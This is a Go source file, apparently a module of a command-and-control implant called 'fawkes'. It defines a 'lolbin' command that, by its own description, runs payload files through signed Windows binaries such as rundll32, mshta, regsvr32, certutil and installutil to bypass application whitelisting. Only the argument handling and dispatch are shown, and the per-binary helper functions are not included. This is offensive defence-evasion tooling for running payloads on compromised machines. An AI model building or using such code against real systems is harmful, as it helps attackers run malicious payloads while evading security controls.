//go:build windows
// +build windows

package commands

import (
	"os"
	"path/filepath"
	"time"

	"fawkes/pkg/structs"
)

const lolbinTimeout = 60 * time.Second

type LolbinCommand struct{}

func (c *LolbinCommand) Name() string {
	return "lolbin"
}

func (c *LolbinCommand) Description() string {
	return "Signed binary proxy execution — execute payloads through legitimate Windows binaries to bypass application whitelisting"
}

type lolbinArgs struct {
	Action string `json:"action"`
	Path   string `json:"path"`
	Export string `json:"export"`
	Args   string `json:"args"`
}

func (c *LolbinCommand) Execute(task structs.Task) structs.CommandResult {
	args, parseErr := requireParams[lolbinArgs](task)
	if parseErr != nil {
		return *parseErr
	}

	if args.Action == "" {
		return errorResult("Error: action is required (rundll32, msiexec, regsvcs, regasm, mshta, certutil, regsvr32, installutil, vbs, lua, python)")
	}

	switch args.Action {
	case "python":
		return lolbinPython(args.Path, args.Args)
	}

	if args.Path == "" {
		return errorResult("Error: path to payload file is required")
	}

	absPath, err := filepath.Abs(args.Path)
	if err != nil {
		return errorf("Error resolving path: %v", err)
	}
	if _, err := os.Stat(absPath); err != nil {
		return errorf("Error: payload file not found: %v", err)
	}

	switch args.Action {
	case "rundll32":
		return lolbinRundll32(absPath, args.Export, args.Args)
	case "msiexec":
		return lolbinMsiexec(absPath, args.Args)
	case "regsvcs":
		return lolbinRegsvcs(absPath, args.Args)
	case "regasm":
		return lolbinRegasm(absPath, args.Args)
	case "mshta":
		return lolbinMshta(absPath, args.Args)
	case "certutil":
		return lolbinCertutil(absPath, args.Args)
	case "regsvr32":
		return lolbinRegsvr32(absPath, args.Args)
	case "installutil":
		return lolbinInstallUtil(absPath, args.Args)
	case "vbs":
		return lolbinVBS(absPath, args.Args)
	case "lua":
		return lolbinLua(absPath, args.Args)
	default:
		return errorf("Unknown action: %s (use rundll32, msiexec, regsvcs, regasm, mshta, certutil, regsvr32, installutil, vbs, lua, python)", args.Action)
	}
}
